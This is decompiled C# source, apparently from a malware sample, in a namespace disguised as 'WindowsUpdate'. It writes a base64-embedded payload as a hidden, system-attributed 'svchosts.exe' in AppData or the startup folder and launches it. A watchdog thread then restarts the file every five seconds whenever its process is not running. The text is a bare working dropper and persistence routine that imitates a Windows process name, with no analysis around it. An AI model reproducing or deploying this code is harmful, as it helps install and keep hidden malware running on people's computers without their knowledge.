using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class WatcherSettings
{
	public int watchert;

	public Thread watchthread;

	public WatcherSettings()
	{
		watchert = 0;
	}

	public void NewWatcher(string WatcherByte)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 499:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0023;
						case 4:
							goto IL_0040;
						case 5:
							goto IL_005b;
						case 6:
							goto IL_007c;
						case 8:
							goto IL_009a;
						case 9:
							goto IL_009c;
						case 10:
							goto IL_00be;
						case 13:
							goto IL_00dd;
						case 14:
							goto IL_00e0;
						case 15:
							goto IL_00fd;
						case 7:
						case 11:
						case 12:
						case 16:
						case 17:
							goto IL_0115;
						case 18:
							goto IL_011f;
						case 19:
							goto IL_0137;
						case 21:
							goto IL_0156;
						case 22:
							goto IL_0159;
						case 20:
						case 23:
						case 24:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 25:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0159:
					num = 22;
					Process.Start(Application.get_StartupPath() + "\\svchosts.exe");
					break;
					IL_0156:
					num = 21;
					goto IL_0159;
					IL_0009:
					num = 2;
					if (Operators.CompareString(A.HardInstall, "True", false) == 0)
					{
						goto IL_0023;
					}
					goto IL_00dd;
					IL_0023:
					num = 3;
					if (File.Exists(Interaction.Environ("AppData") + "\\svchosts.exe"))
					{
						goto IL_0040;
					}
					goto IL_009a;
					IL_0040:
					num = 4;
					File.Delete(Interaction.Environ("AppData") + "\\svchosts.exe");
					goto IL_005b;
					IL_005b:
					num = 5;
					File.WriteAllBytes(Interaction.Environ("AppData") + "\\svchosts.exe", Convert.FromBase64String(WatcherByte));
					goto IL_007c;
					IL_007c:
					num = 6;
					File.SetAttributes(Interaction.Environ("AppData") + "\\svchosts.exe", FileAttributes.Hidden | FileAttributes.System);
					goto IL_0115;
					IL_009a:
					num = 8;
					goto IL_009c;
					IL_009c:
					num = 9;
					File.WriteAllBytes(Interaction.Environ("AppData") + "\\svchosts.exe", Convert.FromBase64String(WatcherByte));
					goto IL_00be;
					IL_00be:
					num = 10;
					File.SetAttributes(Interaction.Environ("AppData") + "\\svchosts.exe", FileAttributes.Hidden | FileAttributes.System);
					goto IL_0115;
					IL_00dd:
					num = 13;
					goto IL_00e0;
					IL_00e0:
					num = 14;
					File.WriteAllBytes(Application.get_StartupPath() + "\\svchosts.exe", Convert.FromBase64String(WatcherByte));
					goto IL_00fd;
					IL_00fd:
					num = 15;
					File.SetAttributes(Application.get_StartupPath() + "\\svchosts.exe", FileAttributes.Hidden | FileAttributes.System);
					goto IL_0115;
					IL_0115:
					num = 17;
					StopWatcher(DeleteWatcher: false);
					goto IL_011f;
					IL_011f:
					num = 18;
					if (Operators.CompareString(A.HardInstall, "True", false) == 0)
					{
						goto IL_0137;
					}
					goto IL_0156;
					IL_0137:
					num = 19;
					Process.Start(Interaction.Environ("AppData") + "\\svchosts.exe");
					break;
					end_IL_0001_2:
					break;
				}
				num = 24;
				KeepWatcherRuning();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 499;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void StopWatcher(bool DeleteWatcher)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 247:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0032;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_004b;
						case 8:
							goto IL_0051;
						case 9:
							goto IL_0069;
						case 11:
							goto IL_0088;
						case 12:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 10:
						case 13:
						case 14:
						case 15:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0025:
					num = 4;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_0032;
					IL_0032:
					num = 5;
					goto IL_0035;
					IL_000a:
					num = 2;
					processesByName = Process.GetProcessesByName("svchosts");
					goto IL_0018;
					IL_0018:
					num = 3;
					array = processesByName;
					num5 = 0;
					goto IL_0035;
					IL_0035:
					if (num5 < array.Length)
					{
						process = array[num5];
						goto IL_0025;
					}
					goto IL_003d;
					IL_003d:
					num = 6;
					watchthread.Abort();
					goto IL_004b;
					IL_004b:
					num = 7;
					if (!DeleteWatcher)
					{
						goto end_IL_0001_3;
					}
					goto IL_0051;
					IL_0051:
					num = 8;
					if (Operators.CompareString(A.HardInstall, "True", false) == 0)
					{
						goto IL_0069;
					}
					goto IL_0088;
					IL_0069:
					num = 9;
					File.Delete(Interaction.Environ("AppData") + "\\svchosts.exe");
					goto end_IL_0001_3;
					IL_0088:
					num = 11;
					break;
					end_IL_0001_2:
					break;
				}
				num = 12;
				File.Delete(Application.get_StartupPath() + "\\svchosts.exe");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 247;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void KeepWatcherRuning()
	{
		watchthread = new Thread(CheckWatcher);
		watchthread.IsBackground = true;
		watchthread.Start();
	}

	private void CheckWatcher()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 272:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_000e;
						case 4:
						case 16:
							goto IL_001d;
						case 5:
							goto IL_002a;
						case 7:
							goto IL_003e;
						case 8:
							goto IL_0041;
						case 9:
							goto IL_0059;
						case 11:
							goto IL_0079;
						case 12:
							goto IL_007d;
						case 6:
						case 10:
						case 13:
						case 14:
						case 15:
							goto IL_009c;
						default:
							goto end_IL_0001;
						case 17:
						case 18:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_009c:
					num = 15;
					ProjectData.ClearProjectError();
					if (num2 != 0)
					{
						num2 = 0;
						goto IL_001d;
					}
					throw ProjectData.CreateProjectError(-2146828268);
					IL_007d:
					num = 12;
					Process.Start(Application.get_StartupPath() + "\\svchosts.exe");
					goto IL_009c;
					IL_0009:
					num = 2;
					num5 = 1;
					goto IL_000e;
					IL_000e:
					num = 3;
					if (num5 == 2)
					{
						goto end_IL_0001_2;
					}
					goto IL_001d;
					IL_001d:
					num = 4;
					Thread.Sleep(5000);
					goto IL_002a;
					IL_002a:
					num = 5;
					if (Process.GetProcessesByName("svchosts").Length <= 0)
					{
						goto IL_003e;
					}
					goto IL_009c;
					IL_003e:
					num = 7;
					goto IL_0041;
					IL_0041:
					num = 8;
					if (Operators.CompareString(A.HardInstall, "True", false) == 0)
					{
						goto IL_0059;
					}
					goto IL_0079;
					IL_0059:
					num = 9;
					Process.Start(Interaction.Environ("AppData") + "\\svchosts.exe");
					goto IL_009c;
					IL_0079:
					num = 11;
					goto IL_007d;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 272;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
